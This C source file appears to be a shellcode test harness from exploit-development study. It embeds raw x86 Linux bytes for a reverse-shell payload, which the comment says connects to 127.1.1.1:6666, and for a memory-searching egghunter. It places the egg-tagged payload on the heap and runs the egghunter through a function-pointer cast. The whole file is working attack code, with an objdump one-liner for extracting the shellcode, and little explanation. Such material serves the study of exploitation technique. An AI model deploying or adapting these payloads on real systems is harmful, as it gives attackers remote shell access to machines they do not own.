#include<stdio.h>
#include<string.h>
#include<stdlib.h>

/* objdump -d ./page_crawling_egghunter.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' */

// shellcode used is the reverse shell shellcode on port 127.1.1.1:6666
unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\x99\x52\x42\x52\x42\x52\xb0\x66\x43\x89\xe1\xcd\x80\x68\x7f\x01\x01\x01\x66\x68\x1a\x0a\x66\x52\x89\xe1\x6a\x10\x51\x92\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\x41\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x99\xcd\x80";

unsigned char egghunter[] = \
"\xfc\x31\xc0\x31\xc9\x99\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x49\x90\x41\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char egg[] = \
"\x90\x49\x90\x41";

int main()
{

	char *memory = malloc(strlen(shellcode) + 50);
	printf("Shellcode Length:  %d\n", strlen(shellcode));
	printf("EggHunter Length:  %d\n", strlen(egghunter));

	memcpy(memory, egg, sizeof(egg));
	memcpy(memory+4, egg, sizeof(egg));
	memcpy(memory+8, shellcode, sizeof(shellcode));
	int (*ret)() = (int(*)())egghunter;
	ret();

	return 0;

}

	
